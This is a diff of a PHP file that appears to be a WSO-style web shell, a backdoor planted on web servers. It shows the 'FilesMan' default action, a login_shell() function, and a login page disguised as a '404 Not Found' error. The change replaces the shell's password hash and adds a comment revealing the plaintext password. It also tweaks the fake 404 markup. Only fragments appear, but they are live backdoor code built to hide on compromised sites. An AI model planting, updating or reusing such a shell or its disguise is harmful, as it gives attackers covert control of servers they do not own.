@@ -8,7 +8,7 @@ session_start();
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
 
-$password = "8a959d4448d56bf127528bf97e2c4bb6";
+$password = "08dff4a1e22ef8db9655b71618e4d961"; //Password: CyberForceX
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
@@ -20,7 +20,7 @@ function login_shell()
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>404 Not Found</title>
+    <title>404 Not Found!</title>
     <style>
         body {
             display: flex;
@@ -125,7 +125,8 @@ function login_shell()
         }
     </style>
 </head>
-<body>
+
+    <body>
     <div class="not-found-container">
         <h1>404</h1>
         <p>Page Not Found</p>
